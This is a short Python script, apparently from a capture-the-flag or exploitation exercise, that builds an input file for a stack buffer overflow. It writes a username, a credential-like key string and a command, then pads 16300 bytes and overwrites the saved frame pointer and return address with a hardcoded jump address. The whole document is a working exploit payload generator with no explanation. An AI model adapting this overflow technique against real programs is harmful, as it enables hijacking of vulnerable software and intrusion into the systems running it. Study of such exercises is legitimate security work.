addr_to_jmp = 0x625019BD


f = open("input.txt", "w")
f.write("""archer
VGPF24IDKK45SBP3
PEEK
""")
f.close()
f = open("input.txt", "ab")
mystr = [ord(i) for i in "stop nirrrr"]
f.write(bytes(mystr))
f.write(bytes([0]*(16300-len(mystr))))
f.write(0x7cfd5f00.to_bytes(4, "little")) # old ebp
f.write(addr_to_jmp.to_bytes(4, "little"))
f.close()

